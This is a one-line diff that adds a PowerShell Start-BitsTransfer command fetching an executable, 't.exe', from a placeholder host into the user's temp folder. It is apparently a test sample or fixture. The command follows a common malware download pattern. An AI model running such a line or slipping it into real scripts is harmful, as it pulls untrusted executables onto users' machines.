@@ -1,0 +1,1 @@
+Start-BitsTransfer -Source 'http://benign3.example/t.exe' -Dest $env:TEMP\t.exe
